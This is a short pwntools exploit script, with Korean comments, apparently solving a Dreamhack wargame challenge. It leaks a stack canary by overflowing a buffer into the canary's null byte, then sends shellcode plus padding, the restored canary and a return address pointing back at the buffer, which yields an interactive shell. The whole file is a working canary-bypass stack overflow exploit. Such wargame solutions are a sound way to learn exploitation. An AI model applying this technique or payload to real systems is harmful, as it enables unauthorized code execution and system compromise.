from pwn import *

context.arch = "amd64"

p = remote('host3.dreamhack.games',22410)

p.recvuntil(b"Address of the buf: ")
buf_addr = int(p.recvline().strip(),16) #recvuntil을 통해 buf주소 획득
log.info(f"Detected buf address: {hex(buf_addr)}")

p.recvuntil(b"Distance between buf and $rbp: ")
buf_to_rbp = int(p.recvline().strip()) #buf와 rbp 사이의 거리 획득
log.info(f"Distance of RBP: {buf_to_rbp}")

canary_offset = buf_to_rbp - 8 #카나리 오프셋 획득 
log.info(f"Canary offset from buf: {canary_offset}")

p.recvuntil(b"Input: ")

payload1 = b"A" * (canary_offset+1) #카나리 직전까지 더미값 넣기
p.send(payload1)

p.recvuntil(b"Your input is '" + payload1)
canary_raw = p.recv(7) #첫번째 바이트를 제외한 카나리 획득
canary = b"\x00"+canary_raw #카나리 전체 8자리 생성
log.success(f"Leaked Canary: {hex(u64(canary))}")

p.recvuntil(b"Input: ")
shellcode = asm(shellcraft.sh())

payload2 = shellcode
payload2 += b"A" * (canary_offset-len(shellcode))
payload2 += canary
payload2 += b"B" * 8 #sfp 자리를 채우기 위함
payload2 += p64(buf_addr)

p.sendline(payload2)

p.interactive()

